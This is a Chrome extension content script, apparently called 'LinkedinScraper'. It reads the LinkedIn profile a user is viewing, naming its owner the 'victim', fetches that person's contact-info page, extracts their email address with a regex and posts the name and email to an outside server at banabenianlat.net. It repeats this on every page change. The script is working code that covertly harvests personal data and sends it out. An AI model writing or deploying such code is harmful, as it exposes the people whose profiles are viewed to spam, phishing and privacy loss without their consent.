console.log("content matched!!!");

// function get_names(){
//     let art_deco = document.getElementsByClassName("artdeco-card");
//     let names = $(".mn-connection-card__name").map( function() {
//         return $(this).text().trim();
//     }).get();
//     return names;
// }

function get_victimname(url){
    return url.substring(url.lastIndexOf("/in/") + 4, url.lastIndexOf("/"));
}

console.log(get_victimname(window.location.href));

function get_victim_email(victim_name){
    $.ajax({ 
    url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/', 
    success: function(data) {
        $htmlData = data;
        $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
        if($email){
           console.log($email[0]);  
        }      
    } });
}
get_victim_email(get_victimname(window.location.href));

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
      // listen for messages sent from background.js
      if (request.message === 'url_changed!') {
        console.log(request.url) // new url is now in content scripts!
        var victim_name = get_victimname(request.url);
        console.log(victim_name);
        $.ajax({ 
            url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/', 
            success: function(data) {
                $htmlData = data;
                $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
                if($email){
                    var postdata_arr = [];
                    postdata_arr.push({username:victim_name,email:$email[0]});
                   console.log(postdata_arr); 
                   $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
                   {
                       postdata:postdata_arr
                   },
                   function(data, status){
                       console.log(status);
                        console.log(" return data : "+data);
                   });

                }      
            } });
      }
  });

